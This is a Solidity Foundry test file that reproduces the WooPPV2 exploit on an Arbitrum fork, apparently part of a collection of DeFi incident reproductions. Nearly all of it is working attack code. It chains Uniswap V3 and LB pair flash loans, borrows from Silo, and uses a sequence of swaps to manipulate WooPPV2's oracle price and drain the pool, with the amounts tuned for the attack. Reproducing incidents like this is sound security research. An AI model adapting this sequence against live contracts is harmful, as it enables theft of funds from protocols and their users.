// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~8M
// Attacker : https://arbiscan.io/address/0x9961190b258897bca7a12b8f37f415e689d281c4
// Attack Contract : https://arbiscan.io/address/0xc3910dca5d3931f4a10261b8f58e1a19a13e0203
// Attack Contract(Main logic) : https://arbiscan.io/address/0x1759f791214168e0292ab6b2180da1c4cf9b764e
// Vulnerable Contract : https://arbiscan.io/address/0xeff23b4be1091b53205e35f3afcd9c7182bf3062 (WooPPV2)
// Attack Tx : https://arbiscan.io/tx/0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd

// @Analysis
// https://twitter.com/spreekaway/status/1765046559832764886
// https://twitter.com/PeckShieldAlert/status/1765054155478175943

interface IUniswapV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ILBTFlashloan {
    function flashLoan(ILBFlashLoanCallback receiver, bytes32 amounts, bytes calldata data) external;
}

interface ILBFlashLoanCallback {
    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32);
}

interface ISilo{
    function deposit(
        address _asset, 
        uint256 _amount, 
        bool _collateralOnly
    ) external returns (uint256 collateralAmount, uint256 collateralShare);

    function liquidity(address _asset) external view returns (uint256);

    function borrow(
        address _asset, 
        uint256 _amount
    ) external returns (uint256 debtAmount, uint256 debtShare);

    function repay(
        address _asset, 
        uint256 _amount
    ) external returns (uint256 repaidAmount, uint256 burnedShare);

    function withdraw(
        address _asset, 
        uint256 _amount, 
        bool _collateralOnly
    ) external returns (uint256 withdrawnAmount, uint256 withdrawnShare);

}

interface IWooPPV2{
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external returns (uint256 realToAmount);

    function poolSize(address token) external view returns (uint256);
}

interface IWooracleV2 {
    struct State {
        uint128 price;
        uint64 spread;
        uint64 coeff;
        bool woFeasible;
    }

    function state(address base) external view returns (State memory);
}

contract ContractTest is Test {
    IERC20 public constant WOO = IERC20(0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b);
    IERC20 public constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 public constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    address public constant WooPPV2 = address(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
    address public constant Silo = address(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);
    address public constant Univ3pool = address(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443); //usdce/weth pool

    address public constant LBT = address(0xB87495219C432fc85161e4283DfF131692A528BD); // woo/weth

    address public constant WooracleV2 = address(0x73504eaCB100c7576146618DC306c97454CB3620); 

    uint256 public woo_lbt_amount;

    uint256 public uni_flash_amount;

    function setUp() public {
        vm.createSelectFork("arbitrum", 187381784);
        vm.label(address(USDCe), "USDCe");
        vm.label(address(WETH), "WETH");
        vm.label(address(WOO), "WOO");
        vm.label(address(LBT), "LBT");
        vm.label(address(WooracleV2), "WooracleV2");
        vm.label(address(Silo), "Silo");
        vm.label(address(Univ3pool), "Univ3pool");
        vm.label(address(WooPPV2), "WooPPV2");
        vm.label(address(this), "Attacker");
    }

    function testExploit() public {
        WOO.approve(WooPPV2, type(uint256).max);
        WOO.approve(Silo, type(uint256).max);
        USDCe.approve(WooPPV2, type(uint256).max);
        USDCe.approve(Silo, type(uint256).max);

        uni_flash_amount = USDCe.balanceOf(Univ3pool) - 10_000_000_000;
        IUniswapV3Flash(Univ3pool).flash(
            address(this),
            0,
            uni_flash_amount,
            new bytes(1)
        );

        console.log("USDCe after hack: %s", USDCe.balanceOf(address(this)));
        console.log("WOO after hack: %s", WOO.balanceOf(address(this)));
        console.log("WETH after hack: %s", WETH.balanceOf(address(this)));

    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 weth_amount = WETH.balanceOf(address(this));
        uint256 usdc_amount = USDCe.balanceOf(address(this));
        woo_lbt_amount = WOO.balanceOf(LBT) - 100;

        ILBTFlashloan(LBT).flashLoan(
            ILBFlashLoanCallback(address(this)), 
            bytes32(woo_lbt_amount), 
            abi.encodePacked(bytes32(woo_lbt_amount), bytes32(0))
        );

        USDCe.transfer(Univ3pool, uni_flash_amount + amount1);
    }

    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32){
        uint256 totalFees_ = uint256(totalFees);
        uint256 usdc_deposit_amount = 7000000000000;
        ISilo(Silo).deposit(address(USDCe), usdc_deposit_amount, true);
        uint256 woo_liquidity_amount = ISilo(Silo).liquidity(address(WOO));
        ISilo(Silo).borrow(address(WOO), woo_liquidity_amount);
        USDCe.transfer(WooPPV2, 2000000000000);
        IWooPPV2(WooPPV2).swap( address(USDCe), address(WETH), 2000000000000, 0, address(this), address(this));
        IWooracleV2(WooracleV2).state(address(WOO));
        USDCe.transfer(WooPPV2, 100000000000);
        IWooPPV2(WooPPV2).swap( address(USDCe),address(WOO), 100000000000, 0, address(this), address(this));
        IWooracleV2(WooracleV2).state(address(WOO));
        // uint256 woo_amount_after = WOO.balanceOf(address(this)); 
        uint256 woo_amount_swap = 7856868800000000000000000; //@note adjusted value, otherwise overflow in price calculation
        WOO.transfer(WooPPV2, woo_amount_swap);
        IWooPPV2(WooPPV2).swap(  address(WOO), address(USDCe), woo_amount_swap, 0, address(this), address(this));
        IWooracleV2(WooracleV2).state(address(WOO)); 
        IWooPPV2(WooPPV2).poolSize(address(WOO));
        
        USDCe.balanceOf(address(this));
        uint256 usdc_amount_drain = 926342; //@note another ajusted value to reflect the pool size

        USDCe.transfer(WooPPV2, usdc_amount_drain);
        IWooPPV2(WooPPV2).swap( address(USDCe),address(WOO), usdc_amount_drain, 0, address(this), address(this));

        ISilo(Silo).repay(address(WOO), type(uint256).max);
        ISilo(Silo).withdraw(address(USDCe), type(uint256).max, true);
        WOO.transfer(LBT, woo_lbt_amount + totalFees_ +10000);
        return keccak256("LBPair.onFlashLoan");
    }
 

    receive() external payable {}
}

